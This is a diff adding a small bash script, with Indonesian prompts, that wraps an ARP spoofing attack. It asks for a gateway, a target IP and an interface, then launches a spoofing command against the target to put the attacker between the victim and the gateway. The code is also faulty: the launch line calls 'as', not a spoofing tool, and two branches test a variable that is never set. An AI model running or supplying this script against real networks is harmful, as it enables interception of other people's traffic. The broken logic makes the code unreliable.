@@ -1,0 +1,67 @@
+#!/bin/bash
+
+clear
+echo "   
+         \033[32;1m..::|[ ARP-Spoof ]|::.. \033[0m
+ "
+
+#gateway
+ipgtw=$(ip route | awk '/default/ { print $3 }')
+echo "[~] Ip Gateway Default : $ipgtw"
+echo -n "[~] Masukan Ip Gateway: "
+read ipyy
+echo "\n[!] IP Gateway : \033[1;4;32m$ipyy\033[0m"
+echo "
+"
+#target
+echo -n "[~] Masukan ip target: "
+read iptarget 
+echo "\n[!] Target dikunci: \033[1;4;32m$iptarget\033[0m"
+echo "
+"
+#interface
+echo -n "[~] Masukan Interface: "
+read interfaces
+echo "\n[!] Interface : \033[1;4;32m$interfaces\033[0m"
+echo "
+"
+
+#preview info
+echo "\033[1;31m[+]\033[0m Preview Info:"
+echo "  \033[1;37m[-]\033[0m Target: \033[1;4;32m$iptarget\033[0m"
+echo "  \033[1;37m[-]\033[0m Interface: \033[1;4;32m$interfaces\033[0m"
+echo "  \033[1;37m[-]\033[0m Gateway: \033[1;4;32m$ipyy\033[0m"
+
+echo "
+=> Tekan \033[33mB\033[0m untuk Lanjut 
+=> Tekan \033[31mK\033[0m untuk Masukan Ulang"
+echo -n "=> Pilihan: "
+read peler
+if [ $peler = b ] || [ $peler = B ]
+then
+echo "
+\033[1;31m[+] \033[0m\033[33mMemulai...\033[0m"
+
+as -i $interfaces -t $iptarget $ipyy
+fi
+
+if [ $peler = k ] || [ $peler = K ]
+then
+clear
+sh spoof
+fi
+
+if [ $upil = b ] || [ $upil = B ]
+then
+clear
+sh start
+fi
+
+if [ $upil = k ] || [ $upil = K ]
+then
+clear
+sh exit
+fi
+
+
+
